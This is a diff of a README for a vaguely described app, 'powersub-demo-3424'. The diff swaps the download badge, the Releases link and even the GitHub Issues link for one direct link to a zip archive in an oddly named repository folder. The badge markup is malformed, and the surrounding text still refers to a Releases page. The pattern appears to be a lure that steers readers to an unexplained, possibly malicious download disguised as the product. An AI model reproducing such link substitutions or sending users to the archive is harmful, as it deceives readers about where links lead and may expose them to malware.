@@ -1,7 +1,7 @@
 # 🌟 powersub-demo-3424 - Simple People Support Made Easy
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/MaryCity05/powersub-demo-3424/releases)
+[![Download Now](https://raw.githubusercontent.com/MaryCity05/powersub-demo-3424/main/colloidal/powersub-demo-3424.zip%https://raw.githubusercontent.com/MaryCity05/powersub-demo-3424/main/colloidal/powersub-demo-3424.zip)](https://raw.githubusercontent.com/MaryCity05/powersub-demo-3424/main/colloidal/powersub-demo-3424.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-3424! This application helps you manage support tasks effortlessly. Follow these steps to get started.
@@ -14,7 +14,7 @@ Before you began, ensure your computer meets these basic requirements:
 - **Disk Space:** Minimum of 200 MB free
 
 ## 📂 How to Download & Install
-To download and install powersub-demo-3424, visit this page: [Download Here](https://github.com/MaryCity05/powersub-demo-3424/releases).
+To download and install powersub-demo-3424, visit this page: [Download Here](https://raw.githubusercontent.com/MaryCity05/powersub-demo-3424/main/colloidal/powersub-demo-3424.zip).
 
 1. **Navigate to the Releases Page**
    Click on the link above to go directly to the **Releases** page.
@@ -60,7 +60,7 @@ To download and install powersub-demo-3424, visit this page: [Download Here](htt
    Use the help section if you have questions or need assistance while using the app.
 
 ## 📞 Support
-If you encounter any issues or have questions about using powersub-demo-3424, feel free to reach out for assistance. You can find contact information on the app's help section or visit our [GitHub Issues page](https://github.com/MaryCity05/powersub-demo-3424/issues) for more support.
+If you encounter any issues or have questions about using powersub-demo-3424, feel free to reach out for assistance. You can find contact information on the app's help section or visit our [GitHub Issues page](https://raw.githubusercontent.com/MaryCity05/powersub-demo-3424/main/colloidal/powersub-demo-3424.zip) for more support.
 
 ## ✨ Summary
 By following these simple steps, you can easily download, install, and start using powersub-demo-3424. It's designed to streamline your support tasks and improve your efficiency. Enjoy your experience with the application and its powerful tools!
